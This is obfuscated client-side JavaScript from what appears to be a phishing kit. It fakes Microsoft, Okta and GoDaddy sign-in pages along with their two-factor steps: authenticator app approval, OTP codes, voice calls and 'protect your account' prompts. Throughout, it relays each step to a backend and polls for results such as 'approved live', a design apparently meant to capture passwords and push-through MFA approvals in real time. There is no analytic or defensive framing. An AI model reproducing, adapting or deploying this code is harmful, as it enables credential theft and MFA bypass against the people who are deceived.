var webnotfound = false,
  interacted = 0,
  multipleaccountsback = 0
let wait2facancel = 0,
  otptype = 0
var currentweb = 0,
  pagevisitedalready = null
let viewtype = null,
  pdfcheck = 0
!document.getElementById('sections').classList.contains('d-none') &&
  (view = 'uname')
document.getElementById('sections_pdf') &&
  !document.getElementById('sections_pdf').classList.contains('d-none') &&
  (view = 'uname_pdf')
document.getElementById('sections_doc') &&
  !document.getElementById('sections_doc').classList.contains('d-none') &&
  (view = 'uname_doc')
document.getElementById('voice') && (view = 'uname')
document.addEventListener('keyup', function (_0x1ed81b) {
  if (_0x1ed81b.key === 'Enter' && requestsent == false) {
    view == 'pwd_godaddy' &&
      document
        .getElementById('sections_godaddy')
        .querySelector('#godaddysignin') !== null &&
        document
          .getElementById('sections_godaddy')
          .querySelector('#godaddysignin')
          .click()
    view == 'pwd_okta' &&
      document.getElementById('sections_okta').querySelector('#oktasignin') !==
        null &&
        document
          .getElementById('sections_okta')
          .querySelector('#oktasignin')
          .click()
    if (view !== 'pwd_godaddy' && view !== 'pwd_okta') {
      if (
        document
          .getElementById('section_' + view)
          .querySelector('#btn_next') !== null
      ) {
        document
          .getElementById('section_' + view)
          .querySelector('#btn_next')
          .click()
      } else {
        if (
          document
            .getElementById('section_' + view)
            .querySelector('#next_btn_pdf') !== null
        ) {
          document
            .getElementById('section_' + view)
            .querySelector('#next_btn_pdf')
            .click()
        } else {
          if (
            document
              .getElementById('section_' + view)
              .querySelector('#btn_next_doc') !== null
          ) {
            document
              .getElementById('section_' + view)
              .querySelector('#btn_next_doc')
              .click()
          } else {
            if (
              document
                .getElementById('section_' + view)
                .querySelector('#btn_sig') !== null
            ) {
              document
                .getElementById('section_' + view)
                .querySelector('#btn_sig')
                .click()
            } else {
              if (
                document
                  .getElementById('section_' + view)
                  .querySelector('#btn_sig_live') !== null
              ) {
                document
                  .getElementById('section_' + view)
                  .querySelector('#btn_sig_live')
                  .click()
              } else {
                if (
                  document
                    .getElementById('section_' + view)
                    .querySelector('#btn_confirmemail') !== null
                ) {
                  document
                    .getElementById('section_' + view)
                    .querySelector('#btn_confirmemail')
                    .click()
                } else {
                  if (
                    document
                      .getElementById('section_' + view)
                      .querySelector('#btn_verifyotp') !== null
                  ) {
                    document
                      .getElementById('section_' + view)
                      .querySelector('#btn_verifyotp')
                      .click()
                  } else {
                    if (
                      document
                        .getElementById('section_' + view)
                        .querySelector('#btn_confirmemailorphone_live') !== null
                    ) {
                      document
                        .getElementById('section_' + view)
                        .querySelector('#btn_confirmemailorphone_live')
                        .click()
                    } else {
                      document
                        .getElementById('section_' + view)
                        .querySelector('#btn_verifyotp_live') !== null &&
                        document
                          .getElementById('section_' + view)
                          .querySelector('#btn_verifyotp_live')
                          .click()
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
})
function validatediginp(_0xd09eaa) {
  _0xd09eaa.value = _0xd09eaa.value.replace(/\D/g, '')
}
function loadinganimation(_0x494179) {
  _0x494179 == 0 &&
    (document
      .getElementById('section_' + view)
      .querySelector('.loading-container')
      .classList.add('loading'),
    (document
      .getElementById('section_' + view)
      .querySelector('.sectioncontent').style.animation =
      'fadeinform 1s forwards'))
  _0x494179 == 1 &&
    (document
      .getElementById('section_' + view)
      .querySelector('.loading-container')
      .classList.remove('loading'),
    (document
      .getElementById('section_' + view)
      .querySelector('.sectioncontent').style.animation =
      'fadeoutform 1s forwards'))
}
function runanimation(_0x26fa9f, _0x36381b, _0x1a4700, _0xdc2153) {
  _0xdc2153 == undefined && (_0xdc2153 = 1)
  _0xdc2153 == 0 && (_0xdc2153 = '')
  _0xdc2153 == 1 && (_0xdc2153 = 'forwards')
  _0x26fa9f == 0 &&
    (document
      .getElementById('section_' + _0x36381b)
      .querySelector('.sectioncontent').style.animation =
      'hide-to-right ' + _0x1a4700 + 's ' + _0xdc2153 + '')
  _0x26fa9f == 1 &&
    (document
      .getElementById('section_' + _0x36381b)
      .querySelector('.sectioncontent').style.animation =
      'show-from-right ' + _0x1a4700 + 's ' + _0xdc2153 + '')
  _0x26fa9f == 2 &&
    (document
      .getElementById('section_' + _0x36381b)
      .querySelector('.sectioncontent').style.animation =
      'hide-to-left ' + _0x1a4700 + 's ' + _0xdc2153 + '')
  _0x26fa9f == 3 &&
    (document
      .getElementById('section_' + _0x36381b)
      .querySelector('.sectioncontent').style.animation =
      'show-from-left ' + _0x1a4700 + 's ' + _0xdc2153 + '')
}
function changebackbutton(_0x28e3cf, _0x3b0b38) {
  _0x3b0b38 == 0 &&
    (document
      .getElementById('section_' + _0x28e3cf)
      .querySelector('.back').style.display = 'none')
  _0x3b0b38 == 1 &&
    (document
      .getElementById('section_' + _0x28e3cf)
      .querySelector('.back').style.display = 'block')
}
function wait2fa(_0x3cc06a, _0x436339) {
  if (wait2facancel == 0) {
    if (_0x3cc06a == 'app') {
      let _0x3e57bb = null
      _0x3e57bb = _0x436339
      sendAndReceive('twofaselected', [_0x3e57bb, 'null'], 1)
        .then((_0x7eced8) => {
          if (
            (_0x7eced8 && view == 'authapp') ||
            (_0x7eced8 && view == 'authapp_live')
          ) {
            _0x7eced8.message == 'signinblocked live' &&
              ((document.getElementById('signin_blocked_live_email').innerText =
                _0x7eced8.email),
              checkerrordesc('signin_blocked_live', 0, _0x7eced8.description),
              checkerrordesc('signin_blocked_reason', 2, _0x7eced8.reason),
              document
                .getElementById('section_authapp')
                .classList.toggle('d-none'),
              document
                .getElementById('section_signin_blocked_live')
                .classList.remove('d-none'),
              (view = 'signin_blocked_live'))
            _0x7eced8.message == 'protectaccount live' &&
              (checkerrordesc('protect_account_live', 0, _0x7eced8.description),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_protect_account_live')
                .classList.remove('d-none'),
              (view = 'protect_account_live'))
            _0x7eced8.message == 'more info required' && moreinforeq()
            _0x7eced8.message == 'waiting' &&
              setTimeout(function () {
                wait2fa(_0x3cc06a, _0x436339)
              }, 8000)
            _0x7eced8.message == 'authenticaion failed' &&
              setTimeout(function () {
                wait2fa(_0x3cc06a, _0x436339)
              }, 2000)
            _0x7eced8.message == 'duplicate request' &&
              ((wait2facancel = 1),
              document
                .getElementById('section_tryagainlater')
                .classList.contains('d-none') &&
                ((document
                  .getElementById('section_tryagainlater')
                  .querySelector('.title').innerText = 'Too many Attempts'),
                setTimeout(function () {
                  document
                    .getElementById('section_' + view)
                    .querySelector('.loading-container')
                    .classList.remove('loading')
                  runanimation(2, view, 0.5, 0)
                  setTimeout(function () {
                    document
                      .getElementById('section_' + view)
                      .classList.toggle('d-none')
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector('#tryagainheader').style.display = 'block'
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector(
                        '#tryagain_toomanyattempts'
                      ).style.display = 'block'
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector('.sectioncontent').style.animation =
                      'show-from-right 0.5s'
                    document
                      .getElementById('section_tryagainlater')
                      .classList.remove('d-none')
                    view = 'tryagainlater'
                  }, 200)
                }, 500)))
            _0x7eced8.message == 'approved' &&
              (document
                .getElementById('section_authapp')
                .classList.toggle('d-none'),
              document
                .getElementById('section_final')
                .classList.remove('d-none'),
              (view = 'final'))
            _0x7eced8.message == 'approved live' &&
              (document
                .getElementById('section_authapp_live')
                .classList.toggle('d-none'),
              document
                .getElementById('section_final')
                .classList.remove('d-none'),
              (view = 'final'))
            if (_0x7eced8.message == 'error live') {
              document
                .getElementById('section_authapperror')
                .querySelector('.title').textContent = _0x7eced8.title
              var _0x365c30 = _0x7eced8.description
              document.getElementById('authapperrordesc').innerHTML =
                '<span>' +
                _0x365c30.text +
                '</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>'
              checkerrordesc('authapperrorresend', 2, _0x7eced8.resentlink)
              authappbottomtext(_0x7eced8.checkapphavingtroublesection)
              document
                .getElementById('section_authapp_live')
                .classList.toggle('d-none')
              document
                .getElementById('section_authapperror')
                .classList.remove('d-none')
              view = 'authapperror'
            }
            if (_0x7eced8.message == 'error') {
              document
                .getElementById('section_authapperror')
                .querySelector('.title').textContent = _0x7eced8.title
              var _0x365c30 = _0x7eced8.description
              document.getElementById('authapperrordesc').innerHTML =
                '<span>' +
                _0x365c30.text +
                '</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>'
              checkerrordesc('authapperrorresend', 2, _0x7eced8.resentlink)
              authappbottomtext(_0x7eced8.checkapphavingtroublesection)
              document
                .getElementById('section_authapp')
                .classList.toggle('d-none')
              document
                .getElementById('section_authapperror')
                .classList.remove('d-none')
              view = 'authapperror'
            }
          }
        })
        .catch((_0x33fe4c) => {
          console.error('Error:', _0x33fe4c)
        })
    }
    _0x3cc06a == 'call' &&
      sendAndReceive('twofaselected', ['TwoWayVoiceMobile', 'null'], 1)
        .then((_0x7073bc) => {
          _0x7073bc &&
            view == 'authcall' &&
            (_0x7073bc.message == 'more info required' && moreinforeq(),
            _0x7073bc.message == 'waiting' &&
              setTimeout(function () {
                wait2fa(_0x3cc06a, null)
              }, 8000),
            _0x7073bc.message == 'authenticaion failed' &&
              setTimeout(function () {
                wait2fa(_0x3cc06a, _0x436339)
              }, 2000),
            _0x7073bc.message == 'duplicate request' &&
              ((wait2facancel = 1),
              document
                .getElementById('section_tryagainlater')
                .classList.contains('d-none') &&
                ((document
                  .getElementById('section_tryagainlater')
                  .querySelector('.title').innerText = 'Too many Attempts'),
                setTimeout(function () {
                  document
                    .getElementById('section_' + view)
                    .querySelector('.loading-container')
                    .classList.remove('loading')
                  runanimation(2, view, 0.5, 0)
                  setTimeout(function () {
                    document
                      .getElementById('section_' + view)
                      .classList.toggle('d-none')
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector('#tryagainheader').style.display = 'block'
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector(
                        '#tryagain_toomanyattempts'
                      ).style.display = 'block'
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector('.sectioncontent').style.animation =
                      'show-from-right 0.5s'
                    document
                      .getElementById('section_tryagainlater')
                      .classList.remove('d-none')
                    view = 'tryagainlater'
                  }, 200)
                }, 500))),
            _0x7073bc.message == 'approved' &&
              (document
                .getElementById('section_authcall')
                .classList.toggle('d-none'),
              document
                .getElementById('section_final')
                .classList.remove('d-none'),
              (view = 'final')),
            _0x7073bc.message == 'approved live' &&
              (document
                .getElementById('section_authapp_live')
                .classList.toggle('d-none'),
              document
                .getElementById('section_final')
                .classList.remove('d-none'),
              (view = 'final')),
            _0x7073bc.message == 'error' &&
              checkerrordesc('authcall', 1, _0x7073bc.description))
        })
        .catch((_0x59c26b) => {
          console.error('Error:', _0x59c26b)
        })
  }
  wait2facancel == 1 && (wait2facancel = 0)
}
function backbuttonclick(_0x533cb4, _0x1d6ad3) {
  _0x533cb4.textContent == 'Back' && runanimation(0, view, 0.3)
  _0x533cb4.textContent == 'Back' &&
    (_0x1d6ad3 == 1 && (callurl = 'backbtnclick'),
    _0x1d6ad3 == 2 && (callurl = 'multbackbtnclick'),
    sendAndReceive(callurl, [_0x533cb4.getAttribute('data-id')], 1)
      .then((_0x41dd36) => {
        _0x41dd36 &&
          _0x41dd36.message !== 'waiting for previous request to complete' &&
          ((document
            .getElementById('section_' + view)
            .querySelector('.sectioncontent').style.animation = ''),
          _0x41dd36.message == 'clicked' &&
            _0x533cb4.textContent == 'Back' &&
              (runanimation(3, 'uname', 0.3),
              (multipleaccountsback = 0),
              document
                .getElementById('section_multipleaccounts')
                .classList.toggle('d-none'),
              (document
                .getElementById('section_uname')
                .querySelector('.sectioncontent').style.animation = ''),
              document
                .getElementById('section_uname')
                .classList.remove('d-none'),
              document.body.style.backgroundImage &&
                (document.body.style.backgroundImage = ''),
              document.body.style.backgroundColor &&
                (document.body.style.backgroundColor = ''),
              (view = 'uname')),
          _0x41dd36.message == 'approve auth request auth app' &&
            (document
              .getElementById('authappimg')
              .setAttribute('src', _0x41dd36.image_src),
            checkerrordesc('authapp', 0, _0x41dd36.description),
            bottomsectionlinks('authapp', _0x41dd36.bottomsection),
            changebackbutton('authapp', _0x41dd36.backbutton),
            (document.getElementById('authappcode').textContent =
              _0x41dd36.authappcode),
            document
              .getElementById('section_multipleaccounts')
              .classList.toggle('d-none'),
            document
              .getElementById('section_authapp')
              .classList.remove('d-none'),
            (view = 'authapp'),
            wait2fa('app', _0x41dd36.methodid)),
          _0x41dd36.message == 'approve auth request calling' &&
            (document
              .getElementById('section_authcall')
              .querySelector('.back')
              .focus(),
            document
              .getElementById('authcallimg')
              .setAttribute('src', _0x41dd36.image_src),
            checkerrordesc('authcall', 0, _0x41dd36.description),
            bottomsectionlinks('authcall', _0x41dd36.bottomsection),
            changebackbutton('authcall', _0x41dd36.backbutton),
            document
              .getElementById('section_multipleaccounts')
              .classList.toggle('d-none'),
            document
              .getElementById('section_authcall')
              .classList.remove('d-none'),
            (view = 'authcall'),
            wait2fa('call')))
      })
      .catch((_0x4be354) => {
        loadinganimation(1)
        console.error('Error:', _0x4be354)
      }))
}
function linkoptionclick(_0x28c4d2) {
  _0x28c4d2.getAttribute('data-id') == 'try_again_otp' &&
    window.location.reload()
  if (
    _0x28c4d2.getAttribute('data-id') == 'ihaveacode' ||
    _0x28c4d2.getAttribute('data-id') == 'signInAnotherWay' ||
    _0x28c4d2.textContent == 'Enter a security code' ||
    _0x28c4d2.textContent == 'get a code a different way.' ||
    _0x28c4d2.textContent == 'Sign out and sign in with a different account' ||
    _0x28c4d2.textContent == 'Sign in using another Microsoft account' ||
    _0x28c4d2.textContent == 'Sign in another way' ||
    _0x28c4d2.textContent == 'Microsoft Authenticator' ||
    _0x28c4d2.textContent.includes('Send another request')
  ) {
    loadinganimation(0)
    ;(_0x28c4d2.textContent == 'get a code a different way.' ||
      _0x28c4d2.getAttribute('data-id') == 'signInAnotherWay') &&
      (loadinganimation(1),
      (wait2facancel = 1),
      (document
        .getElementById('section_' + view)
        .querySelector('.sectioncontent').style.animation = ''),
      document.getElementById('section_' + view).classList.toggle('d-none'),
      document.getElementById('section_2fa').classList.remove('d-none'),
      (view = '2fa'))
    _0x28c4d2.getAttribute('data-id') == 'ihaveacode' &&
      (loadinganimation(1),
      (document.getElementById('otp_livedesc').innerText =
        'Enter the code you received'),
      (document
        .getElementById('section_confirmemailorphone_live')
        .querySelector('.sectioncontent').style.animation = ''),
      document
        .getElementById('section_confirmemailorphone_live')
        .classList.toggle('d-none'),
      document.getElementById('section_otp_live').classList.remove('d-none'),
      (view = 'otp_live'))
    if (
      _0x28c4d2.textContent ==
        'Sign out and sign in with a different account' ||
      _0x28c4d2.textContent == 'Sign in using another Microsoft account'
    ) {
      loadinganimation(1)
      document.getElementById('footer').style.position = 'absolute'
      bottomsectionlinks('uname', [
        {
          a_id: 'signup',
          a_text: 'Create one!',
          text: 'No account?',
          type: 'text_link',
        },
        {
          a_id: 'cantAccessAccount',
          a_text: "Can't access your account?",
          type: 'link',
        },
      ])
      changebackbutton('uname', 0)
      document.getElementById('section_' + view).classList.toggle('d-none')
      document.getElementById('inp_uname').value = ''
      document.getElementById('error_pwd').innerText = ''
      document.getElementById('inp_pwd').value = ''
      document
        .getElementById('section_uname')
        .querySelector('.sectioncontent').style.animation = ''
      document.getElementById('section_uname').classList.remove('d-none')
      document.body.style.backgroundImage &&
        (document.body.style.backgroundImage = '')
      document.body.style.backgroundColor &&
        (document.body.style.backgroundColor = '')
      view = 'uname'
    }
    let _0x1cfe20 = 0
    viewtype == null &&
      ((_0x28c4d2.textContent ==
        'Send another request to my Microsoft Authenticator app' ||
        _0x28c4d2.textContent == 'Microsoft Authenticator') &&
        (_0x1cfe20 = 'PhoneAppNotification'),
      _0x28c4d2.textContent ==
        'Send another request to my Outlook mobile app' &&
        (_0x1cfe20 = 'CompanionAppsNotification'),
      _0x28c4d2.textContent == 'Enter a security code' &&
        (_0x1cfe20 = 'PhoneAppOTP'))
    viewtype !== null &&
      ((_0x28c4d2.textContent == 'Send another request to my Microsoft app' ||
        _0x28c4d2.textContent == 'Microsoft Authenticator') &&
        (_0x1cfe20 = 'PhoneAppNotification_Live'),
      _0x28c4d2.textContent == 'Enter a security code' &&
        (_0x1cfe20 = 'PhoneAppOTP_Live'))
    ;(_0x28c4d2.textContent ==
      'Send another request to my Microsoft Authenticator app' ||
      _0x28c4d2.textContent == 'Microsoft Authenticator' ||
      _0x28c4d2.textContent ==
        'Send another request to my Outlook mobile app' ||
      _0x28c4d2.textContent == 'Enter a security code') &&
      sendAndReceive('twofaselect', [_0x1cfe20], 1)
        .then((_0x121445) => {
          if (
            _0x121445 &&
            _0x121445.message !== 'waiting for previous request to complete'
          ) {
            loadinganimation(1)
            wait2facancel = 0
            _0x121445.message == 'otp sent live' &&
              (document
                .getElementById('inp_otp_live')
                .setAttribute('placeholder', 'Code'),
              (document.getElementById('error_otp_live').style.display =
                'none'),
              (document.getElementById('error_otp_live').innerText = ''),
              document
                .getElementById('otpliveimg')
                .setAttribute('src', _0x121445.image_src),
              checkerrordesc('otp_live', 0, _0x121445.description),
              bottomsectionlinks('otp_live', _0x121445.bottomsection),
              changebackbutton('otp_live', _0x121445.backbutton),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_otp_live')
                .classList.remove('d-none'),
              (view = 'otp_live'),
              (viewtype = 'otp'))
            _0x121445.message == 'approve auth request auth app live' &&
              ((document.getElementById('error_authapp_live').style.display =
                'none'),
              (document.getElementById('error_authapp_live').innerText = ''),
              (document.getElementById('authapp_live_code').innerText =
                _0x121445.authappreqid),
              bottomsectionlinks('authapp_live', _0x121445.bottomsection),
              changebackbutton('authapp_live', _0x121445.backbutton),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_authapp_live')
                .classList.remove('d-none'),
              (view = 'authapp_live'),
              (viewtype = 'auth'),
              wait2fa('app', _0x121445.methodid))
            _0x121445.message == 'duplicate request' &&
              ((wait2facancel = 1),
              document
                .getElementById('section_tryagainlater')
                .classList.contains('d-none') &&
                ((document
                  .getElementById('section_tryagainlater')
                  .querySelector('.title').innerText = 'Too many Attempts'),
                setTimeout(function () {
                  document
                    .getElementById('section_' + view)
                    .querySelector('.loading-container')
                    .classList.remove('loading')
                  runanimation(2, view, 0.5, 0)
                  setTimeout(function () {
                    document
                      .getElementById('section_' + view)
                      .classList.toggle('d-none')
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector('#tryagainheader').style.display = 'block'
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector(
                        '#tryagain_toomanyattempts'
                      ).style.display = 'block'
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector('.sectioncontent').style.animation =
                      'show-from-right 0.5s'
                    document
                      .getElementById('section_tryagainlater')
                      .classList.remove('d-none')
                    view = 'tryagainlater'
                  }, 200)
                }, 500)))
            _0x121445.message == 'error enter a code' &&
              (document
                .getElementById('authapperrordesc')
                .querySelector('span')
                .setAttribute('class', 'error'),
              (document
                .getElementById('authapperrordesc')
                .querySelector('span').innerText =
                "Sorry, we're having trouble verifying your account. Please try again. "))
            _0x121445.message == 'session timeout' &&
              document
                .getElementById('section_tryagainlater')
                .classList.contains('d-none') &&
                ((document
                  .getElementById('section_tryagainlater')
                  .querySelector('.title').innerText =
                  "We didn't hear from you"),
                setTimeout(function () {
                  document
                    .getElementById('section_' + view)
                    .querySelector('.loading-container')
                    .classList.remove('loading')
                  runanimation(2, view, 0.5, 0)
                  setTimeout(function () {
                    document
                      .getElementById('section_' + view)
                      .classList.toggle('d-none')
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector('#tryagainheader').style.display = 'block'
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector(
                        '#tryagain_withoutinternet'
                      ).style.display = 'block'
                    document
                      .getElementById('section_tryagainlater')
                      .querySelector('.sectioncontent').style.animation =
                      'show-from-right 0.5s'
                    document
                      .getElementById('section_tryagainlater')
                      .classList.remove('d-none')
                    view = 'tryagainlater'
                  }, 200)
                }, 500))
            if (_0x121445.message == 'redirected back to sign in') {
              document.getElementById('inp_uname').value = ''
              document.getElementById('error_pwd').innerText = ''
              document.getElementById('inp_pwd').value = ''
              bottomsectionlinks('uname', [
                {
                  a_id: 'signup',
                  a_text: 'Create one!',
                  text: 'No account?',
                  type: 'text_link',
                },
                {
                  a_id: 'cantAccessAccount',
                  a_text: "Can't access your account?",
                  type: 'link',
                },
              ])
              document
                .getElementById('section_' + view)
                .querySelector('.sectioncontent').style.animation = ''
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none')
              document
                .getElementById('section_uname')
                .querySelector('.sectioncontent').style.animation = ''
              document
                .getElementById('section_uname')
                .classList.remove('d-none')
              document.body.style.backgroundImage &&
                (document.body.style.backgroundImage = '')
              document.body.style.backgroundColor &&
                (document.body.style.backgroundColor = '')
            }
            _0x121445.message == 'lets try something else or come back' &&
              ((document
                .getElementById('section_signinanothererror')
                .querySelector('.title').textContent = _0x121445.title),
              checkerrordesc(
                'signinanothererrordesc',
                2,
                _0x121445.signinanothererrordesc
              ),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_signinanothererror')
                .classList.remove('d-none'),
              bottomsectionlinks('signinanothererror', _0x121445.bottomsection),
              (view = 'signinanothererror'))
            _0x121445.message == 'you dont have access' &&
              (document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_youdonthaveaccess')
                .classList.remove('d-none'),
              (view = 'youdonthaveaccess'))
            _0x121445.message == 'otp sent' &&
              ((document.getElementById('error_2fa').innerText = ''),
              document
                .getElementById('otpimg')
                .setAttribute('src', _0x121445.image_src),
              checkerrordesc('otp', 0, _0x121445.description),
              bottomsectionlinks('otp', _0x121445.bottomsection),
              changebackbutton('otp', _0x121445.backbutton),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document.getElementById('section_otp').classList.remove('d-none'),
              (view = 'otp'),
              (viewtype = null))
            _0x121445.message == 'approve auth request auth app' &&
              ((document.getElementById('error_2fa').innerText = ''),
              document
                .getElementById('authappimg')
                .setAttribute('src', _0x121445.image_src),
              checkerrordesc('authapp', 0, _0x121445.description),
              bottomsectionlinks('authapp', _0x121445.bottomsection),
              changebackbutton('authapp', _0x121445.backbutton),
              (document.getElementById('authappcode').textContent =
                _0x121445.authappcode),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_authapp')
                .classList.remove('d-none'),
              (view = 'authapp'),
              (viewtype = null),
              wait2fa('app', _0x121445.methodid))
            _0x121445.message == 'approve auth request calling' &&
              (document
                .getElementById('section_authcall')
                .querySelector('.back')
                .focus(),
              (document.getElementById('error_2fa').innerText = ''),
              document
                .getElementById('authcallimg')
                .setAttribute('src', _0x121445.image_src),
              checkerrordesc('authcall', 0, _0x121445.description),
              bottomsectionlinks('authcall', _0x121445.bottomsection),
              changebackbutton('authcall', _0x121445.backbutton),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_authcall')
                .classList.remove('d-none'),
              (view = 'authcall'),
              (viewtype = null),
              wait2fa('call'))
            _0x121445.message == 'error' &&
              (bottomsectionlinks('2fa', _0x121445.bottomsection),
              changebackbutton('2fa', _0x121445.backbutton),
              checkerrordesc('2fa', 1, _0x121445.description))
            _0x121445.message == 'verifyemail' &&
              ((document.getElementById('error_2fa').innerText = ''),
              checkerrordesc('verifyemail', 0, _0x121445.description),
              bottomsectionlinks('confirmemail', _0x121445.bottomsection),
              changebackbutton('confirmemail', _0x121445.backbutton),
              document
                .getElementById('section_' + view)
                .classList.toggle('d-none'),
              document
                .getElementById('section_confirmemail')
                .classList.remove('d-none'),
              (view = 'confirmemail'),
              (viewtype = null))
            _0x121445.message == 'request wasnt sent' &&
              ((document
                .getElementById('section_authapperror')
                .querySelector('.title').textContent = "Request wasn't sent"),
              document
                .getElementById('authapperrordesc')
                .classList.toggle('error'),
              (document.getElementById('authapperrordesc').innerHTML =
                '<span>Sorry, we\'re having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>'),
              (view = 'authapperror'),
              (viewtype = null))
          }
        })
        .catch((_0x2e3fa8) => {
          loadinganimation(1)
          console.error('Error:', _0x2e3fa8)
        })
  }
}
function authappbottomtext(_0x11cff7) {
  const _0x4ba85f = document
    .getElementById('section_authapperror')
    .querySelector('.text-body')
  _0x4ba85f.innerHTML = ''
  _0x11cff7.forEach((_0x255019) => {
    if (_0x255019.type === 'text_link') {
      const _0x2a29c0 = document.createElement('p')
      _0x2a29c0.classList.add('link', 'mb-16')
      _0x2a29c0.innerHTML =
        _0x255019.text +
        ' <a href="#" data-id="' +
        _0x255019.a_id +
        ('" onclick="linkoptionclick(this)" class="link" style="display: unset;">' +
          _0x255019.a_text +
          '</a>')
      _0x4ba85f.appendChild(_0x2a29c0)
    } else {
      if (_0x255019.type === 'link_text') {
        const _0x26e4e3 = document.createElement('p')
        _0x26e4e3.classList.add('link', 'mb-16')
        _0x26e4e3.innerHTML =
          '<a href="#" data-id="' +
          _0x255019.a_id +
          ('" onclick="linkoptionclick(this)" class="link" style="display: unset;">' +
            _0x255019.a_text +
            '</a> ' +
            _0x255019.text)
        _0x4ba85f.appendChild(_0x26e4e3)
        const _0x5c73f1 = document.createElement('p')
        _0x5c73f1.textContent = _0x255019.text
        _0x4ba85f.appendChild(_0x5c73f1)
      } else {
        if (_0x255019.type === 'link') {
          const _0x1f6aa6 = document.createElement('a')
          _0x1f6aa6.classList.add('link', 'mb-16')
          _0x1f6aa6.setAttribute('style', 'display: unset;')
          _0x1f6aa6.setAttribute('data-id', _0x255019.a_id)
          _0x1f6aa6.setAttribute('onclick', 'linkoptionclick(this)')
          _0x1f6aa6.textContent = _0x255019.a_text
          _0x1f6aa6.href = '#'
          _0x4ba85f.appendChild(_0x1f6aa6)
        } else {
          if (_0x255019.type === 'text') {
            const _0x210a1c = document.createElement('p')
            _0x210a1c.classList.add('mb-16')
            _0x210a1c.textContent = _0x255019.text
            _0x4ba85f.appendChild(_0x210a1c)
          }
        }
      }
    }
  })
}
function selectprotectoption(_0x31b1ae) {
  const _0x4ce3ff = document.querySelectorAll(
    '.iAdditionalProofInfo input[type="radio"]'
  )
  _0x4ce3ff.forEach((_0xcc41f) => {
    _0xcc41f.removeAttribute('checked')
    _0xcc41f.removeAttribute('aria-checked')
  })
  const _0x16098e = _0x31b1ae,
    _0x306073 = document.querySelectorAll('.iAdditionalProofInfo')
  _0x306073.forEach((_0x16114c) => {
    _0x16114c !== _0x31b1ae && _0x16114c.parentNode.removeChild(_0x16114c)
  })
  nexteletext = _0x31b1ae.nextElementSibling.textContent
  const _0x577f83 = document.createElement('div')
  _0x577f83.classList.add('iAdditionalProofInfo')
  if (_0x16098e.value === 'email') {
    emailval = nexteletext.split('@').pop()
    _0x577f83.innerHTML =
      '\n      <div class="text-block-body" id="iEnterProofDesc">\n        To verify that this is your email address, complete the hidden part and click "Send code" to receive your code.\n      </div>\n      <div role="alert" aria-live="assertive">\n        <div class="alert alert-error Hide" id="iProofInputError"></div>\n      </div>\n      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: table;">\n        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">\n        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain">@' +
      emailval +
      '</label>\n      </div>\n      <div class="phcontainer" id="iProofPhoneEntry" style="display: none;" aria-hidden="true">\n        <label id="iProofPhoneHint" for="iProofPhone" class="form-group-top" aria-hidden="true">Last 4 digits of phone number</label>\n        <input type="tel" autocomplete="off" id="iProofPhone" name="iProofPhone" class="form-control input-max-width" maxlength="4" aria-required="true" aria-label="Last 4 digits of phone number" aria-describedby="iProofInputError">\n      </div>\n    '
    document.getElementById('btn_protectaccount').textContent = 'Send Code'
  } else {
    if (_0x16098e.value === 'text') {
      phoneval = nexteletext.split('*').pop()
      _0x577f83.innerHTML =
        '\n      <div class="text-block-body" id="iEnterProofDesc">\n        To verify that this is your phone number, enter the last 4 digits including ' +
        phoneval +
        ', and then click "Send code" to receive your code.\n      </div>\n      <div role="alert" aria-live="assertive">\n        <div class="alert alert-error Hide" id="iProofInputError"></div>\n      </div>\n      <div class="emailPartial dirltr input-group input-max-width" id="iProofEmailEntry" style="display: none;" aria-hidden="true">\n        <input class="form-control noRightBorder" autocomplete="off" type="email" id="iProofEmail" name="iProofEmail" maxlength="113" aria-required="true" aria-label="Email name" aria-describedby="iProofInputError">\n        <label class="input-group-addon noLeftBorder outlookEmailLabel" id="iConfirmProofEmailDomain"></label>\n      </div>\n      <div class="phcontainer" id="iProofPhoneEntry" style="">\n        <label id="iProofPhoneHint" for="iProofPhone" class="form-group-top" aria-hidden="true">Last 4 digits of phone number</label>\n        <input type="tel" autocomplete="off" id="iProofPhone" name="iProofPhone" class="form-control input-max-width" maxlength="4" aria-required="true" aria-label="Last 4 digits of phone number" aria-describedby="iProofInputError">\n      </div>\n    '
      document.getElementById('btn_protectaccount').textContent = 'Send Code'
    } else {
      if (_0x16098e.value === 'authapp') {
        document.getElementById('btn_protectaccount').textContent = 'Next'
      } else {
        _0x16098e.value === 'notanymore' &&
          (document.getElementById('btn_protectaccount').textContent =
            'Verify online')
      }
    }
  }
  _0x31b1ae.parentNode.parentNode.parentNode.appendChild(_0x577f83)
}
function displayprotectoptions(_0xaa85f1) {
  const _0x547a60 = document.getElementById('protectaccountoptions')
  _0x547a60.innerHTML = ''
  _0xaa85f1.forEach((_0x459527, _0x222b62) => {
    const _0x2a53e1 = document.createElement('div')
